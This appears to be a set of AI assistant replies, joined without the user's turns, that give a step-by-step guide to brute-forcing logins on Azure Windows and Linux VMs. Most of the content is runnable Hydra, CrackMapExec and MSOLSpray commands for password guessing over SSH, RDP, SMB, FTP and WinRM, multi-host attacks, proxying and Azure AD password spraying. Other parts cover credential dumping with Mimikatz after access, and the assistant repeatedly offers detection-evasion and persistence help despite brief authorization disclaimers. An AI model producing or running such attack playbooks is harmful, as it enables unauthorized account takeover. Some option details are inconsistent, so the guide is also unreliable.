Password attacks with Hydra

# Hydra

**Introduction to Hydra**

- Hydra is a fast and flexible network logon cracker supporting many
  protocols.

- Used for brute forcing login credentials on services such as SSH, RDP,
  FTP, HTTP, SMB, etc.

- Essential for testing weak password policies and credential re-use
  vulnerabilities on Azure VMs.

------------------------------------------------------------------------

**Step 1: Setup & Preparation**

- Ensure Hydra is installed on your attack machine (Kali Linux, Parrot,
  etc.).

- Collect target VM IP/hostname, service port, and protocol (e.g., SSH
  on port 22).

- Identify usernames or password lists for attack or plan to brute force
  both.

------------------------------------------------------------------------

**Step 2: Guess Password for a Specific Username**

- Command format:

- hydra -l \<username\> -P \<password_list.txt\> \<target_ip\> ssh

- Example:

- hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.0.5 ssh

- Tries passwords against a known username (e.g., "admin").

------------------------------------------------------------------------

**Step 3: Guess Username for a Specific Password**

- Command format:

- hydra -L \<username_list.txt\> -p \<password\> \<target_ip\> ssh

- Example:

- hydra -L usernames.txt -p 'Password123!' 10.0.0.5 ssh

- Attempts to find which username matches the known password.

------------------------------------------------------------------------

**Step 4: Brute Force Username and Password Combinations**

- Command format:

- hydra -L \<username_list.txt\> -P \<password_list.txt\> \<target_ip\>
  ssh

- Example:

- hydra -L usernames.txt -P passwords.txt 10.0.0.5 ssh

- Tries all combinations from username and password lists.

------------------------------------------------------------------------

**Step 5: Verbose and Debug Mode for Detailed Output**

- Add -v for verbose and -V for showing each attempt.

- Useful for real-time monitoring.

- hydra -l admin -P rockyou.txt -vV 10.0.0.5 ssh

------------------------------------------------------------------------

**Step 6: NULL, Same as Login, or Reverse Login Attempts**

- -n option can be used for NULL passwords.

- Testing empty or password = username.

- hydra -l admin -p '' 10.0.0.5 ssh

- hydra -l admin -p admin 10.0.0.5 ssh

------------------------------------------------------------------------

**Step 7: Saving Output to Disk**

- Use -o to save results.

- hydra -l admin -P rockyou.txt -o results.txt 10.0.0.5 ssh

------------------------------------------------------------------------

**Step 8: Resume Brute Force Attack**

- Use -r to resume after interruption.

- hydra -r -o results.txt -l admin -P rockyou.txt 10.0.0.5 ssh

------------------------------------------------------------------------

**Step 9: Password Generation Using Various Character Sets**

- Use external tools or wordlists that cover complex character sets.

- Combine with Hydra to target password complexity.

------------------------------------------------------------------------

**Step 10: Attack on Specific Ports**

- Specify port using -s

- hydra -l admin -P passwords.txt -s 2222 10.0.0.5 ssh

------------------------------------------------------------------------

**Step 11: Attacking Multiple Hosts**

- Use target list file with -M

- hydra -L usernames.txt -P passwords.txt -M targets.txt ssh

------------------------------------------------------------------------

**Step 12: Using Combo Entries (username:password)**

- Use combo list file with -C

- hydra -C combos.txt ssh

------------------------------------------------------------------------

**Step 13: Concurrent Testing on Multiple Logins**

- Control parallelism with -t (number of tasks)

- hydra -l admin -P passwords.txt -t 8 10.0.0.5 ssh

------------------------------------------------------------------------

**Step 14: HTTP Login Form Brute Force**

- Use HTTP module for web forms.

- Requires parameters like form action, method, and field names.

- hydra -l admin -P passwords.txt 10.0.0.5 http-post-form
  "/login:username=^USER^&password=^PASS^:F=incorrect"

------------------------------------------------------------------------

**Step 15: Attacking Secured Service Connections**

- For SSL/TLS encrypted services, add -S

- hydra -l admin -P passwords.txt -S 10.0.0.5 ftp

------------------------------------------------------------------------

**Step 16: Proxy Support**

- **Unauthenticated Proxy:**

  - Export environment variable:

  - export http_proxy="http://proxy_ip:proxy_port"

  - Or use proxychains:

  - proxychains hydra -l admin -P passwords.txt 10.0.0.5 ssh

- **Authenticated Proxy:**

  - Setup proxychains config with credentials.

  - Or export environment with username/password.

------------------------------------------------------------------------

**Azure Windows VM Vulnerabilities Typically Exploited**

- Weak or default passwords on RDP or WinRM.

- Unpatched vulnerabilities exploitable after login (e.g., privilege
  escalation).

- Exposed services (RDP, SMB) with weak authentication.

- Misconfigured Network Security Groups allowing brute force traffic.

- Lack of multi-factor authentication on remote access.

------------------------------------------------------------------------

**Summary Notes**

- Hydra is most effective when combined with good intelligence on
  usernames/passwords.

- Always respect legal and ethical guidelines — test only authorized
  environments.

- On Azure, focus on checking if port 22 (Linux SSH) or 3389 (Windows
  RDP) are exposed and vulnerable to brute forcing.

- Combine Hydra results with post-exploitation tools to escalate
  privileges or move laterally.

- Monitor for detection alerts when performing brute force attempts,
  especially on Azure Defender or other endpoint protection.

------------------------------------------------------------------------

If you want, I can also prepare detailed walkthroughs for **specific
exploitation scenarios** post-Hydra access on Azure Windows/Linux VMs
(e.g., privilege escalation, lateral movement). Would you like that?

Certainly! Here's a **corrected and concise summary** of how to perform
penetration testing on Azure Windows/Linux VMs using Hydra, including
detailed steps, commands, and relevant Azure VM vulnerabilities
exploited. I've removed duplicates and focused on clarity and
completeness.

------------------------------------------------------------------------

**How to Perform Penetration Testing on Azure Windows/Linux VMs Using
Hydra**

------------------------------------------------------------------------

**Introduction to Hydra**

- **Hydra** is a fast, parallelized network login cracker supporting a
  wide variety of protocols.

- It enables security testers to demonstrate how easy it might be to
  gain unauthorized remote access by brute forcing credentials.

- Supports many services relevant to Azure VMs, including:\
  SSH, RDP, SMB, FTP, HTTP(S) (including web forms), MSSQL, MySQL,
  Redis, Telnet, SMTP, VNC, and more.

- SSL/TLS support is included for many protocols (e.g., HTTPS, FTPS).

- Flexible modular design allows addition of new protocols.

------------------------------------------------------------------------

**Step-by-Step Pentesting Using Hydra**

------------------------------------------------------------------------

**Step 1: Preparation**

- Identify the **target VM's IP address** or DNS name.

- Determine which **services and ports are open** (e.g., SSH 22 for
  Linux, RDP 3389 for Windows).

- Gather or create **username and password lists** or combos for
  testing.

------------------------------------------------------------------------

**Step 2: Basic Brute Force on Specific Username**

- **Command:**

- hydra -l \<username\> -P \<password_list.txt\> \<target_ip\> ssh

- Example (Linux SSH brute force):

- hydra -l azureuser -P /usr/share/wordlists/rockyou.txt 20.30.40.50 ssh

------------------------------------------------------------------------

**Step 3: Brute Force for Username Using Known Password**

- **Command:**

- hydra -L \<username_list.txt\> -p \<password\> \<target_ip\> ssh

- Example:

- hydra -L usernames.txt -p 'P@ssw0rd123' 20.30.40.50 ssh

------------------------------------------------------------------------

**Step 4: Brute Force Username and Password Combination**

- **Command:**

- hydra -L \<username_list.txt\> -P \<password_list.txt\> \<target_ip\>
  ssh

- Example:

- hydra -L usernames.txt -P passwords.txt 20.30.40.50 ssh

------------------------------------------------------------------------

**Step 5: Verbose Mode for Real-Time Feedback**

- Add -vV for detailed output showing every attempt.

- hydra -l admin -P passwords.txt -vV 20.30.40.50 rdp

------------------------------------------------------------------------

**Step 6: Attacking Other Protocols**

- Replace ssh with relevant protocol such as rdp (Windows Remote
  Desktop), smb (file shares), ftp, http-get, http-post-form, etc.

- Example for Windows RDP brute forcing:

- hydra -l administrator -P passwords.txt 20.30.40.50 rdp

------------------------------------------------------------------------

**Step 7: Targeting Specific Ports**

- Use -s \<port\> to specify a non-default port.

- Example (SSH on port 2222):

- hydra -l azureuser -P passwords.txt -s 2222 20.30.40.50 ssh

------------------------------------------------------------------------

**Step 8: Attacking Multiple Targets**

- Use a file with multiple IPs via -M option.

- Example:

- hydra -L usernames.txt -P passwords.txt -M targets.txt ssh

------------------------------------------------------------------------

**Step 9: Using Combo Files (username:password)**

- Use the -C option with a combo list.

- Example:

- hydra -C combos.txt ssh

------------------------------------------------------------------------

**Step 10: Proxy Support**

- For attacks via proxies, set environment variables or use proxychains.

- Example (proxychains):

- proxychains hydra -l admin -P passwords.txt 20.30.40.50 ssh

------------------------------------------------------------------------

**Common Azure Windows VM Vulnerabilities Exploited**

- **Weak Passwords:** Default or guessable passwords on RDP or WinRM
  services.

- **Exposed Management Ports:** RDP (3389), SSH (22), SMB (445), and
  WinRM (5985/5986) open to the internet.

- **Lack of Network Security Group (NSG) Restrictions:** Misconfigured
  NSGs allow brute force attacks.

- **No Multi-Factor Authentication (MFA):** Makes brute force viable.

- **Unpatched Systems:** Vulnerable to post-authentication privilege
  escalation exploits.

- **Default or weak service configurations** (e.g., SMB signing
  disabled).

**Example Azure Windows VM Brute Force Attack on RDP**

hydra -l Administrator -P /usr/share/wordlists/rockyou.txt 20.30.40.50
rdp -vV

- Once valid credentials are found, attacker can log in and escalate
  privileges or move laterally.

------------------------------------------------------------------------

**Best Practices and Ethical Considerations**

- Always have **explicit authorization** before testing.

- Use this process to identify weak credentials and improve security.

- Combine Hydra results with **post-exploitation tools** (e.g.,
  PowerShell scripts, Mimikatz) for full assessment.

------------------------------------------------------------------------

Would you like me to include detailed post-exploitation steps or
specific exploitation commands for Azure Windows/Linux VMs after gaining
access?

Sure! Here's a clean, detailed, and corrected summary on **how to
pentest Azure Windows/Linux VMs for local accounts, AD accounts, and
Microsoft Entra ID accounts**, focusing on password guessing and brute
forcing, plus additional relevant info to cover your needs fully and
without duplicates:

------------------------------------------------------------------------

**Pentesting Azure Windows/Linux VMs for Local, AD, and Entra ID
Accounts**

**Objective:**

Identify weak or guessable credentials for local machine accounts,
Active Directory (AD) accounts, and Microsoft Entra ID (Azure AD)
accounts, using brute force or password spraying attacks against
available services on Azure VMs.

------------------------------------------------------------------------

**1. Password Guessing / Brute Force on Azure VMs**

If you have a valid username but don't know the password, you can
attempt to guess or brute-force the password by targeting services
exposed on the VM. Common services to target:

- FTP (File Transfer Protocol)

- SSH (Linux VMs)

- RDP (Windows VMs, with tools supporting RDP brute force)

- SMB (Windows file shares)

- WinRM (Windows Remote Management)

------------------------------------------------------------------------

**2. Brute Forcing FTP Service (Example)**

If the Azure VM runs an FTP service, you can try brute forcing FTP login
using **Hydra**, a fast and flexible brute force tool.

**Command Example:**

hydra -l ignite -P pass.txt ftp://192.168.1.141

- -l ignite — specify the username (ignite)

- -P pass.txt — specify the password list file (pass.txt)

- ftp://192.168.1.141 — target host IP and service protocol

**Notes:**

- Make sure the FTP service is reachable (open port 21 or custom port).

- Password list (pass.txt) should contain common or custom passwords for
  guessing.

- This method applies similarly to other protocols supported by Hydra
  (ssh, smb, rdp, etc.).

------------------------------------------------------------------------

**3. Brute Forcing SSH (Linux VMs)**

For Linux VMs, SSH is the typical remote access. To brute force SSH
login:

hydra -l ignite -P pass.txt ssh://192.168.1.141

or

hydra -L users.txt -P pass.txt ssh://192.168.1.141

- -L users.txt allows testing multiple usernames.

- SSH brute forcing may be slowed by rate limiting or locked accounts.

------------------------------------------------------------------------

**4. RDP Brute Force (Windows VMs)**

For Windows VMs with RDP enabled, brute forcing can be done using tools
like **Ncrack** or **Hydra**:

hydra -t 4 -V -f -l Administrator -P pass.txt rdp://192.168.1.141

- -t 4 sets parallel tasks.

- -V verbose.

- -f exits after first valid credential is found.

------------------------------------------------------------------------

**5. SMB Brute Force / Password Spraying**

SMB is used in Windows environments for file sharing and domain
communication.

Example using **CrackMapExec** or **Hydra** for SMB:

hydra -l ignite -P pass.txt smb://192.168.1.141

Or

crackmapexec smb 192.168.1.141 -u ignite -p pass.txt

------------------------------------------------------------------------

**6. Azure VM Vulnerabilities and Considerations**

- **Open Services:** Attackers must find exposed services (FTP, SSH,
  RDP, SMB, WinRM) with weak or guessable passwords.

- **Default / Weak Credentials:** Azure VMs may have weak local accounts
  or default passwords if not properly secured.

- **Lack of Multi-Factor Authentication (MFA):** Local accounts and
  Azure AD accounts may be compromised more easily if MFA is not
  enforced.

- **No Account Lockout Policies:** Without lockout, brute force attacks
  can continue indefinitely.

- **Misconfigured Network Security Groups (NSGs):** Allowing unnecessary
  ports increases attack surface.

- **No Logging / Alerting:** Detection may be absent or delayed if Azure
  Monitor or Defender is not configured.

------------------------------------------------------------------------

**7. Testing Local Accounts**

- Local accounts exist only on the VM itself (Windows or Linux).

- Test using brute force on local services like SSH (Linux), RDP or
  WinRM (Windows), or FTP if configured.

------------------------------------------------------------------------

**8. Testing AD Accounts (On Domain-Joined VMs)**

- For domain-joined VMs, AD accounts can be brute-forced using SMB,
  Kerberos, or LDAP protocols.

- Tools: **Impacket suite** (e.g., smbclient, wmiexec.py, crackmapexec),
  **Hydra**, **Nmap scripts**.

Example (SMB authentication):

hydra -L ad_users.txt -P pass.txt smb://192.168.1.141

------------------------------------------------------------------------

**9. Testing Microsoft Entra ID (Azure AD) Accounts**

- Azure AD is cloud-based; brute forcing via traditional protocols on
  the VM is limited.

- Attack vectors include password spraying against Azure AD login
  portals or exploiting weakly configured Azure AD accounts.

- Use tools like **MSOLSpray** or **Azure AD Password Spray** scripts to
  attempt password spraying against Azure AD.

- MFA enforcement reduces risks significantly.

- Azure AD accounts can also be tested through application proxy
  services, conditional access misconfigurations, or legacy
  authentication protocols if enabled.

------------------------------------------------------------------------

**10. Additional Useful Commands and Tools**

- **Nmap:** To scan open ports and services:

nmap -sV -p 21,22,135,139,445,3389 192.168.1.141

- **Enum4linux:** For enumerating Windows shares and users:

enum4linux -a 192.168.1.141

- **CrackMapExec:** For SMB and WinRM testing:

crackmapexec smb 192.168.1.141 -u ignite -p pass.txt

- **Impacket Tools:** For executing commands and dumping credentials.

------------------------------------------------------------------------

**Summary**

| **Phase** | **Service/Protocol** | **Tool/Command Example** | **Target** | **Account Type** | **Notes** |
|----|----|----|----|----|----|
| Password brute force | FTP | hydra -l ignite -P pass.txt ftp://192.168.1.141 | Azure VM IP | Local or domain user | Must have FTP service running |
| SSH brute force | SSH | hydra -l ignite -P pass.txt ssh://192.168.1.141 | Linux VM | Local user | SSH must be open |
| RDP brute force | RDP | hydra -l Administrator -P pass.txt rdp://192.168.1.141 | Windows VM | Local/AD Administrator | RDP port must be open |
| SMB brute force | SMB | hydra -l ignite -P pass.txt smb://192.168.1.141 | Windows VM | AD or local user | SMB port open (445) |
| AD Account brute force | SMB, LDAP, Kerberos | crackmapexec smb 192.168.1.141 -u users.txt -p pass.txt | Domain joined VM | AD users | Domain joined VM required |
| Azure AD password spray | Azure AD login | Use MSOLSpray or custom scripts targeting Azure AD | Azure AD Portal | Azure AD accounts | MFA enforcement blocks attacks |

------------------------------------------------------------------------

If you want, I can provide a fully scripted step-by-step pentest
playbook covering these attack vectors with commands, prerequisites, and
expected outputs. Would you like me to do that?

------------------------------------------------------------------------

Let me know if you want me to expand on any step or tool!

Certainly! Here's a clean, corrected, and detailed summary on **how to
pentest Azure Windows/Linux VMs for local accounts, AD accounts, and
Microsoft Entra ID accounts** focusing on **username guessing, password
guessing, and brute forcing both username and password** — with
commands, options explained, vulnerabilities targeted, and duplicates
removed.

------------------------------------------------------------------------

**Pentesting Azure Windows/Linux VMs: Username & Password Guessing /
Brute Forcing**

------------------------------------------------------------------------

**1. Goal:**

Identify valid username and/or password combinations to gain
unauthorized access to services running on Azure VMs. This applies to
local accounts (on the VM), Active Directory (AD) accounts (on
domain-joined VMs), and potentially Microsoft Entra ID accounts (via
web/portal).

------------------------------------------------------------------------

**2. Common Targeted Services on Azure VMs:**

- FTP (port 21)

- SSH (port 22)

- RDP (port 3389, Windows)

- SMB (port 445)

- WinRM (ports 5985/5986, Windows)

------------------------------------------------------------------------

**3. Guessing Username for Known Password**

If you know a valid password but don’t know the username:

Use **Hydra** to brute force usernames against the target service with a
fixed password.

**Example: Brute forcing usernames for FTP service**

hydra -L users.txt -p 123 ftp://192.168.1.141

- -L users.txt — specifies username wordlist file.

- -p 123 — sets a fixed password (123).

- ftp://192.168.1.141 — target FTP service.

------------------------------------------------------------------------

**4. Brute Forcing Both Username and Password**

When neither username nor password is known:

Use Hydra with both username and password wordlists.

**Example: FTP brute force with both usernames and passwords:**

hydra -L users.txt -P pass.txt ftp://192.168.1.141

- -L users.txt — username wordlist.

- -P pass.txt — password wordlist.

- Hydra tries all combinations (username × password).

------------------------------------------------------------------------

**5. Verbose and Debug Modes**

- -V (verbose mode): Shows each login attempt with username + password
  tried.

Example:

hydra -L users.txt -P pass.txt ftp://192.168.1.141 -V

If users.txt contains 5 usernames and pass.txt contains 7 passwords,
Hydra will try 35 combinations and print each attempt.

- -d (debug mode): Shows detailed internal info about connection, wait
  times, socket info, process IDs, data received, etc.

Example:

hydra -l ignite -P pass.txt ftp://192.168.1.141 -d

- -l ignite means fixed username (ignite).

- -P pass.txt password wordlist.

- Debug mode helps troubleshoot connection issues and analyze attack
  progress in detail.

------------------------------------------------------------------------

**6. Tools and Command Variants**

- Replace ftp:// with ssh://, rdp://, smb:// depending on the service.

- Example SSH brute force:

hydra -L users.txt -P pass.txt ssh://192.168.1.141 -V

- Example RDP brute force:

hydra -L users.txt -P pass.txt rdp://192.168.1.141 -V

**7. Azure VM Vulnerabilities Exploited**

- **Weak or predictable usernames:** Users often choose common usernames
  (admin, user, ignite, etc.).

- **Weak or default passwords:** Password lists often contain common
  passwords like "123", "password", etc.

- **No account lockout policy:** Allows unlimited login attempts (no
  throttling or temporary blocks).

- **Open and exposed services:** Services like FTP, SSH, RDP exposed to
  public internet or accessible internal network.

- **Misconfigured Network Security Groups (NSGs):** Allow inbound
  traffic on unnecessary ports.

- **Lack of MFA:** No multi-factor authentication on accounts for
  additional security layer.

------------------------------------------------------------------------

**8. Summary Table**

| **Attack Type** | **Command Example** | **Description** | **Notes** |
|----|----|----|----|
| Username guessing (fixed password) | hydra -L users.txt -p 123 ftp://192.168.1.141 | Brute force username with known password | Useful if password known |
| Password guessing (fixed username) | hydra -l ignite -P pass.txt ftp://192.168.1.141 | Brute force password with known username | FTP service example |
| Username + Password brute force | hydra -L users.txt -P pass.txt ftp://192.168.1.141 -V | Brute force both username and password | Verbose shows all attempts |
| Debug mode (detailed info) | hydra -l ignite -P pass.txt ftp://192.168.1.141 -d | Debug info for attack progress troubleshooting | Use for deeper attack analysis |

------------------------------------------------------------------------

If you want, I can help you build a full pentesting checklist or script
for Azure VM credential brute forcing and detection evasion. Would you
like that?

------------------------------------------------------------------------

Let me know if you want me to clarify or add steps for AD account brute
forcing or Microsoft Entra ID password spraying!

Great! Here’s a **full pentesting checklist and step-by-step guide**
with detailed commands for **credential brute forcing and password
spraying on Azure Windows/Linux VMs**, covering:

- Local accounts

- Active Directory (AD) accounts (domain-joined VMs)

- Microsoft Entra ID (Azure AD) accounts (cloud identities)

------------------------------------------------------------------------

**Azure VM Pentesting Credential Attack Checklist & Guide**

------------------------------------------------------------------------

**1. Preparation & Reconnaissance**

**a) Discover open services on Azure VM**

nmap -sV -p- 192.168.1.141

- Identify open ports (e.g., 21 FTP, 22 SSH, 135/139/445 SMB, 3389 RDP,
  5985/5986 WinRM).

**b) Enumerate services and users (Windows example)**

enum4linux -a 192.168.1.141

- Lists shares, users, OS details on Windows SMB.

------------------------------------------------------------------------

**2. Credential Attacks on Local and AD Accounts**

------------------------------------------------------------------------

**a) Username Guessing with Known Password**

**Example: FTP username guessing**

hydra -L users.txt -p 123 ftp://192.168.1.141

- users.txt: candidate usernames.

- 123: known password.

- Repeat for SSH, SMB, RDP by changing protocol prefix.

------------------------------------------------------------------------

**b) Password Guessing with Known Username**

**Example: FTP password brute force**

hydra -l ignite -P pass.txt ftp://192.168.1.141

- ignite: known username.

- pass.txt: password wordlist.

------------------------------------------------------------------------

**c) Brute Forcing Both Username and Password**

**Example: FTP full brute force**

hydra -L users.txt -P pass.txt ftp://192.168.1.141 -V

- Verbose -V shows each attempt.

- Use for SSH, SMB, RDP similarly.

------------------------------------------------------------------------

**d) SMB and WinRM Brute Force (Domain-Joined Windows VM)**

**Using CrackMapExec (CME):**

crackmapexec smb 192.168.1.141 -u users.txt -p pass.txt

- Attempts SMB login with all username-password combos.

- WinRM brute force (may require CME --winrm flag).

------------------------------------------------------------------------

**e) Additional Hydra Options for Tuning**

- -t \<num\>: Number of parallel tasks (increase speed).

- -f: Exit after first success.

- -d: Debug mode for detailed logs.

- -V: Verbose mode for login attempts.

------------------------------------------------------------------------

**3. Microsoft Entra ID (Azure AD) Password Spraying**

------------------------------------------------------------------------

**a) Azure AD Password Spraying Overview**

- Password spraying tries a few common passwords (e.g., Summer2023!,
  Password1) across many users.

- Avoids account lockout by limiting attempts per user.

- Requires internet access to Azure AD login endpoints.

------------------------------------------------------------------------

**b) Tools**

- **MSOLSpray** (Python tool)

- Custom PowerShell or Python scripts using MS Graph API or Azure AD API

- **Impacket's GetNPUsers.py** (to enumerate users with Kerberos
  pre-auth disabled)

------------------------------------------------------------------------

**c) Basic MSOLSpray Example**

python3 msolspray.py -d yourdomain.com -u users.txt -p
common_passwords.txt --output result.txt

- -d: domain.

- -u: username list.

- -p: password list.

- Outputs valid login attempts to result.txt.

**d) MFA and Conditional Access**

- MFA enforced accounts resist password spraying.

- Try to identify accounts without MFA.

------------------------------------------------------------------------

**4. Post-Compromise Enumeration (If Credentials Found)**

- Use valid creds to connect (SSH, RDP, SMB, WinRM).

- Dump further credentials with **Mimikatz** or **Impacket’s
  secretsdump.py**.

- Enumerate AD info with BloodHound.

------------------------------------------------------------------------

**5. Mitigations to Look for During Pentest**

- Account lockout policies

- MFA enforcement

- Network Security Groups limiting inbound access

- Strong password policies

- Azure Defender and monitoring logs enabled

------------------------------------------------------------------------

**Summary Table of Commands**

| **Step** | **Command/Tool** | **Purpose** |
|----|----|----|
| Port and service scan | nmap -sV -p- 192.168.1.141 | Discover open ports and services |
| Enumerate Windows users | enum4linux -a 192.168.1.141 | Enumerate SMB shares, users |
| Username guessing (FTP) | hydra -L users.txt -p 123 ftp://192.168.1.141 | Brute force usernames with known pwd |
| Password guessing (FTP) | hydra -l ignite -P pass.txt ftp://192.168.1.141 | Brute force passwords with known user |
| Username+Password brute force | hydra -L users.txt -P pass.txt ftp://192.168.1.141 -V | Brute force both username and password |
| SMB brute force (CME) | crackmapexec smb 192.168.1.141 -u users.txt -p pass.txt | SMB login brute force |
| Azure AD password spraying | python3 msolspray.py -d yourdomain.com -u users.txt -p common_passwords.txt --output result.txt | Spray Azure AD passwords |

------------------------------------------------------------------------

If you want, I can help you automate this entire process with scripts or
expand on post-exploitation and detection evasion techniques. Just say
the word!

Certainly! Here's a **corrected, detailed, and deduplicated summary** on
how to perform password brute forcing on Azure Windows/Linux VMs for
**local accounts, AD accounts, and Microsoft Entra ID accounts**,
focusing on Hydra’s advanced features, output handling, and resuming
attacks.

------------------------------------------------------------------------

**Azure VM Pentesting: Password Brute Forcing with Hydra — Detailed
Steps & Commands**

------------------------------------------------------------------------

**1. Context:**

- Target services on Azure Windows/Linux VMs (FTP, SSH, SMB, RDP).

- Accounts could be local VM accounts or AD domain accounts.

- Goal: Brute force passwords effectively, including edge cases like
  null passwords or username-based passwords.

------------------------------------------------------------------------

**2. Hydra’s Special Password Options (-e)**

Hydra can automatically test **additional common password cases** during
brute forcing using the -e option:

- n — test **null password** (empty password).

- s — test password **same as username**.

- r — test password **reverse of username**.

This means for each username, Hydra tries these special passwords
*before* moving on to the passwords from your wordlist.

**Command example:**

hydra -L users.txt -P pass.txt ftp://192.168.1.141 -V -e nsr

- -L users.txt — username list.

- -P pass.txt — password list.

- -e nsr — try null, same as username, reverse username passwords.

- -V — verbose output to show every attempt.

- ftp://192.168.1.141 — target FTP service.

------------------------------------------------------------------------

**3. Saving Output to Disk**

For record-keeping, review, or automation, Hydra allows saving results
directly to a file:

- Save plain text:

hydra -L users.txt -P pass.txt ftp://192.168.1.141 -o result.txt

- Save in JSON format (structured, easier for parsing):

hydra -L users.txt -P pass.txt ftp://192.168.1.141 -o result.json

The -o option stores valid credential combinations found during the
brute force.

------------------------------------------------------------------------

**4. Resuming Interrupted Brute Force Attacks**

If your brute force attack is interrupted (e.g., by accident or network
issues), you don’t need to start over.

Hydra supports resuming with:

- Start attack:

hydra -L users.txt -P pass.txt ftp://192.168.1.141

- Interrupt attack with CTRL + C.

- Resume attack later with:

hydra -R

Hydra will continue from where it stopped, saving time on large
wordlists.

------------------------------------------------------------------------

**5. Summary of Hydra Options Used**

| **Option** | **Purpose** |
|----|----|
| -L | Username wordlist file |
| -l | Single username |
| -P | Password wordlist file |
| -p | Single password |
| -e nsr | Try null (n), same as username (s), reverse username (r) passwords |
| -V | Verbose mode, show each login attempt |
| -o | Save results to file (plain text or JSON) |
| -R | Resume previously interrupted attack |

------------------------------------------------------------------------

**6. Azure VM Vulnerabilities Exploited**

- **Weak password policies:** Empty passwords, username-based passwords,
  and easily guessable passwords are common vulnerabilities.

- **No account lockout:** Allows Hydra to brute force indefinitely.

- **Exposed services:** FTP, SSH, SMB accessible from internet or
  internal network without adequate firewall rules.

- **Lack of monitoring:** No alerts or logs for brute force attempts.

------------------------------------------------------------------------

If you want, I can also provide step-by-step examples applying this to
AD accounts (via SMB/WinRM), SSH on Linux VMs, or password spraying
Microsoft Entra ID accounts. Just ask!

Awesome! Here’s a **detailed step-by-step guide** for pentesting **Local
Accounts, AD Accounts, and Microsoft Entra ID (Azure AD) accounts** on
Azure Windows/Linux VMs using brute forcing and password spraying,
building on the Hydra techniques with extended examples for SMB, SSH,
WinRM, and Azure AD.

------------------------------------------------------------------------

**Azure VM Pentesting Credential Attacks — Full Guide with Commands &
Details**

------------------------------------------------------------------------

**1. Local and AD Accounts: Brute Forcing with Hydra & CrackMapExec**

**a) Brute Forcing FTP, SSH, SMB, WinRM Services**

- **FTP example (Linux/Windows VM)**

hydra -L users.txt -P pass.txt ftp://192.168.1.141 -V -e nsr -o
ftp_results.json

- -e nsr: try null, same, reverse username passwords before wordlist

- -V: verbose login attempt output

- -o: save results in JSON

------------------------------------------------------------------------

- **SSH example (Linux VM)**

hydra -L users.txt -P pass.txt ssh://192.168.1.141 -t 4 -V -e nsr -o
ssh_results.json

- -t 4: run 4 parallel tasks for speed

- Same -e nsr to test null/same/reverse passwords

------------------------------------------------------------------------

- **SMB example (Windows AD-joined VM) using CrackMapExec**

crackmapexec smb 192.168.1.141 -u users.txt -p pass.txt
--continue-on-success

- Tries username/password combos against SMB

- Can brute force domain accounts

- Use --continue-on-success to keep going after valid creds found

------------------------------------------------------------------------

- **WinRM example (Windows AD-joined VM)**

crackmapexec winrm 192.168.1.141 -u users.txt -p pass.txt

- Attempts WinRM authentication (PowerShell remoting)

------------------------------------------------------------------------

**b) Resuming Interrupted Hydra Attacks**

- Start brute force normally:

hydra -L users.txt -P pass.txt ftp://192.168.1.141

- Stop attack (Ctrl+C) and resume:

hydra -R

------------------------------------------------------------------------

**2. Microsoft Entra ID (Azure AD) Password Spraying**

**a) Password Spraying with MSOLSpray**

- MSOLSpray limits attempts to avoid lockouts and detects accounts with
  weak passwords.

python3 msolspray.py -d yourdomain.com -u users.txt -p
common_passwords.txt --output azuread_results.txt

- users.txt: list of Azure AD usernames

- common_passwords.txt: typical weak passwords like Summer2023!,
  Password1

- Outputs valid logins to file

------------------------------------------------------------------------

**b) Consider MFA and Conditional Access**

- Many Azure AD accounts use MFA, which blocks password-only brute
  forcing.

- Focus on identifying accounts **without MFA** for effective spraying.

------------------------------------------------------------------------

**3. Post-Exploitation Enumeration (After Valid Credentials Found)**

- Use valid creds to connect and enumerate:

**a) SMB**

smbclient -L \\\\192.168.1.141 -U ignite

- List shares and accessible resources

**b) RDP or SSH**

- Connect with found credentials for shell or GUI access

**c) Dump credentials on Windows**

Invoke-Mimikatz

- Extract cached credentials and hashes

------------------------------------------------------------------------

**4. Vulnerabilities Exploited**

- **Weak or default passwords** (null, username as password, reversed
  username)

- **Lack of account lockout** policies on services like FTP, SSH, SMB,
  WinRM

- **Open remote management ports** exposed without firewall restrictions

- **No MFA on Azure AD accounts**

- **Poor monitoring and alerting**

------------------------------------------------------------------------

**5. Summary of Common Commands**

| **Task** | **Command Example** |
|----|----|
| FTP brute force with null/same/rev password | hydra -L users.txt -P pass.txt ftp://192.168.1.141 -V -e nsr -o result.json |
| SSH brute force | hydra -L users.txt -P pass.txt ssh://192.168.1.141 -t 4 -V -e nsr |
| SMB brute force | crackmapexec smb 192.168.1.141 -u users.txt -p pass.txt --continue-on-success |
| WinRM brute force | crackmapexec winrm 192.168.1.141 -u users.txt -p pass.txt |
| Resume Hydra attack | hydra -R |
| Azure AD password spraying | python3 msolspray.py -d yourdomain.com -u users.txt -p common_passwords.txt --output results.txt |

------------------------------------------------------------------------

If you want, I can also help you write automation scripts to combine all
these steps into one pentest toolkit or extend it for detection evasion
and persistence on Azure VMs. Let me know!

Certainly! Here’s a **clean, detailed, corrected, and non-duplicated
summary** of how to perform pentesting on Azure Windows/Linux VMs for
**Local accounts, AD accounts, and Microsoft Entra ID accounts**
focusing on **password brute forcing and Hydra usage** with all
important options and details:

------------------------------------------------------------------------

**Azure VM Pentesting: Password Brute Forcing & Hydra Usage — Detailed
Guide**

------------------------------------------------------------------------

**Overview**

Password brute forcing on Azure VMs (Windows/Linux) involves guessing
usernames and/or passwords for services like FTP, SSH, SMB, WinRM to
gain unauthorized access to:

- **Local accounts** (local machine users)

- **Active Directory accounts** (domain users)

- **Microsoft Entra ID (Azure AD) accounts** (via password spraying
  tools)

This guide focuses on Hydra usage for password generation, multi-host
attacks, custom ports, and concurrent attempts.

------------------------------------------------------------------------

**1. Generating Passwords Using Character Sets (-x option)**

- -x min:max:charset generates passwords with:

  - **min** = minimum length of password

  - **max** = maximum length

  - **charset** = character types to include:

    - 1 = numbers (0-9)

    - a = lowercase letters

    - A = uppercase letters

    - Any other characters included literally

**Example:**

hydra -l ignite -x 1:3:1 ftp://192.168.1.141 -V

- Generates numeric passwords of length 1 to 3 (e.g., 1, 12, 123)

- Attempts login for user ignite on FTP service at 192.168.1.141

- -V verbose mode shows each attempt details

- Found success with password 123

------------------------------------------------------------------------

**2. Specifying Custom Ports (-s option)**

Admins may change default service ports (e.g., SSH from 22 to 2222).

**Steps:**

1.  **Scan for open ports and service versions:**

nmap -sV 192.168.1.141

2.  **Run Hydra brute force on detected port (e.g., SSH at port 2222):**

hydra -L users.txt -P pass.txt ssh://192.168.1.141 -s 2222 -V

- -s 2222 specifies custom port

- -L users.txt user list

- -P pass.txt password list

